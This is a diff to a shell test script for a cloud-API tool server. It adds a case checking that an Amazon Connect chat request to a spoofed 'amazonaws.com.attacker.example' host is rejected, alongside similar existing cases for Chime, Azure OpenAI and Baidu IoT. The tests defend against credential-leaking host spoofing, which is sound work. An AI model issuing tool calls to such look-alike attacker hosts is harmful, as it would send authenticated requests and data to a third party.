@@ -53,6 +53,7 @@ trap 'rm -f "${RESPONSES}" "${MUTATION_RESPONSES}"' EXIT
   printf '%s\n' '{"jsonrpc":"2.0","id":36,"method":"tools/call","params":{"name":"aws_api_read","arguments":{"auth_scheme":"chime-messaging-ws","service":"chime-messaging","operation":"SubscribeMessages","region":"us-east-1","method":"GET","url":"wss://data-messaging.chime.aws.attacker.example/connect","body":{"user_arn":"arn:aws:chime:us-east-1:123456789012:app-instance/app-1/user/observer","session_id":"session-1","max_messages":1,"timeout_seconds":5},"response_file":"/tmp/chime-messaging.ndjson"}}}'
   printf '%s\n' '{"jsonrpc":"2.0","id":37,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"openai-chat-stream","service":"openai","operation":"StreamChatCompletions","method":"POST","url":"https://demo.openai.azure.com.attacker.example/openai/deployments/gpt-4o-deployment/chat/completions","api_version":"2024-06-01","body":{"model":"gpt-4o-deployment","messages":[{"role":"user","content":"Hello"}],"max_events":1,"timeout_seconds":5},"response_file":"/tmp/chat-stream.ndjson"}}}'
   printf '%s\n' '{"jsonrpc":"2.0","id":38,"method":"tools/call","params":{"name":"azure_api_read","arguments":{"auth_scheme":"openai-responses-stream","service":"openai","operation":"StreamResponses","method":"POST","url":"https://demo.openai.azure.com.attacker.example/openai/v1/responses","api_version":"v1","body":{"model":"gpt-5-deployment","input":"Hello","max_events":1,"timeout_seconds":5},"response_file":"/tmp/responses-stream.ndjson"}}}'
+  printf '%s\n' '{"jsonrpc":"2.0","id":39,"method":"tools/call","params":{"name":"aws_api_mutate","arguments":{"auth_scheme":"connect-chat-ws","service":"connect","operation":"ObserveChat","region":"us-east-1","method":"POST","url":"wss://participant.connect.us-east-1.amazonaws.com.attacker.example/participant/connect","body":{"instance_id":"12345678-1234-1234-1234-123456789012","contact_flow_id":"arn:aws:connect:us-east-1:123456789012:contact-flow/87654321-4321-4321-4321-210987654321","display_name":"Observer","max_events":1,"timeout_seconds":5},"response_file":"/tmp/connect-chat.ndjson","force":true}}}'
 } | env -i HOME=/nonexistent PATH=/usr/bin:/bin "${BINARY}" > "${RESPONSES}"
 
 jq -e -s '
@@ -129,7 +130,9 @@ jq -e -s '
     ($responses | map(select(.id == 37))[0].result.isError == true) and
     ($responses | map(select(.id == 37))[0].result.content[0].text | contains("exact public-cloud resource.openai.azure.com host")) and
     ($responses | map(select(.id == 38))[0].result.isError == true) and
-    ($responses | map(select(.id == 38))[0].result.content[0].text | contains("exact public-cloud resource.openai.azure.com host"))
+    ($responses | map(select(.id == 38))[0].result.content[0].text | contains("exact public-cloud resource.openai.azure.com host")) and
+    ($responses | map(select(.id == 39))[0].result.isError == true) and
+    ($responses | map(select(.id == 39))[0].result.content[0].text | contains("exact official participant.connect.<region>.amazonaws.com host"))
 ' "${RESPONSES}" >/dev/null
 
 printf '%s\n' '{"jsonrpc":"2.0","id":32,"method":"tools/call","params":{"name":"baiducloud_api_mutate","arguments":{"auth_scheme":"iotcore-http-pub","service":"iotcore","operation":"PublishHTTP","method":"POST","url":"https://aop098js.iot.gz.baidubce.com.attacker.example/pub","body":{"topic":"commands/device-1","qos":1,"payload_base64":"dHVybi1vbg=="},"force":true}}}' |
